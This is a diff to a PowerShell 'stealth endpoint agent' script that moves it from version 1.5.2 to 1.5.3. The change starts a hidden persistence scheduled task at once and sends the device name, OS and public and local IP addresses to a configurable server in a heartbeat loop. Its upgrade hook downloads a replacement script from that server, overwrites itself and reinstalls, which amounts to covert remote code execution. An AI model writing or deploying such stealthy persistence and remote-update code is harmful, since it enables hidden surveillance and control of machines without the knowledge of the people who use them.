@@ -3,7 +3,7 @@ param(
 )
 
 # Unified Enterprise Agent (UEA)
-# Version: 1.5.2
+# Version: 1.5.3
 # Description: Professional stealth endpoint agent with premium Support GUI.
 
 # 1. ENVIRONMENT SANITATION
@@ -41,7 +41,7 @@ function Install-StealthAgent {
     if (-not $IsAdmin) { return }
     try {
         if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.5.2" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.5.3" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -56,7 +56,13 @@ function Install-StealthAgent {
         
         Unregister-ScheduledTask -TaskName "UnifiedEnterpriseAgent" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
         Register-ScheduledTask -TaskName "UEA_Persistence" -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
-    } catch {}
+        Start-ScheduledTask -TaskName "UEA_Persistence" | Out-Null
+        Log-Message "Stealth Persistence Installed & Started."
+        if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
+            Write-Host "Equinox Stealth Architecture v1.5.3 Installed. Background process started. Exiting..."
+            exit
+        }
+    } catch { Log-Message "Install Fail: $($_.Exception.Message)" }
 }
 
 # 4. INITIALIZATION
@@ -77,7 +83,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.5.2 Started. ID: $AgentId"
+    Log-Message "Agent v1.5.3 Started. ID: $AgentId"
 
     # 5. HEARTBEAT LOOP
     while ($true) {
@@ -85,14 +91,17 @@ try {
             $Response = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body (ConvertTo-Json @{
                 agentId = $AgentId
                 serialNumber = $SerialNumber
-                version = "1.5.2"
+                version = "1.5.3"
                 status = "online"
                 deviceName = $env:COMPUTERNAME
+                os = (Get-CimInstance Win32_OperatingSystem).Caption
+                publicIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip } catch { "Unknown" }
                 localIp = try { (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPv4Address -notlike "169.254*" } | Select-Object -First 1).IPv4Address } catch { "Unknown" }
+                isp = "Managed Endpoint"
             }) -ContentType "application/json"
 
             # Upgrade Hook
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.5.2")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.5.3")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
